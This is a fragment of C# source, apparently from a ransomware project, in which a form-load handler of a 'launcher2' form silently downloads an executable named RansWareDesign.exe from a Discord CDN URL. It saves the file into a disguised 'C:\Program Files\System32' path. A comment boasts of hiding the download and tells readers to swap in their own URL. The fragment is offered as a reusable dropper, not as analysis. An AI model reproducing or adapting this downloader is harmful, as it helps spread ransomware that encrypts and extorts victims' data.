...
namespace Ransomware
{
    public partial class launcher2 : Form
    {
        ...
        private void launcher2_Load(object sender, EventArgs e)
        {
            ...
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/921937959392018483/929449813039271956/RansWareDesign.exe", @"C:\Program Files\System32\RansWareDesign.exe"); //Hide donwloading :-), please change url to your 
        ...
        private void launcher2_Load_1(object sender, EventArgs e)
        {
